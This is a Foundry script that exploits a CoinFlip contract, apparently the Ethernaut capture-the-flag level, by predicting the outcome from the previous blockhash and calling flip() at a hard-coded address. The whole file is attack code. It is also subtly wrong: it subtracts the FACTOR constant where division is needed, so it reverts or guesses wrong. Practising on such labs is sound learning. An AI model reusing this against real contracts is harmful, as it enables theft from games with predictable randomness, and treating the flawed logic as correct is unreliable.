// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "../src/level3/CoinFlip.sol";
import "forge-std/console.sol";

contract level3Exploit is Script {
    CoinFlip coinflip = CoinFlip(0x3A9BF4bb8be13178Cd5cDc089C866fFf2b547CF4);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flip = blockValue - FACTOR;

        bool winningSide = flip == 1 ? true : false;
        coinflip.flip(winningSide);
        console.log("Wins: ", coinflip.consecutiveWins());

        vm.stopBroadcast();
    }
}
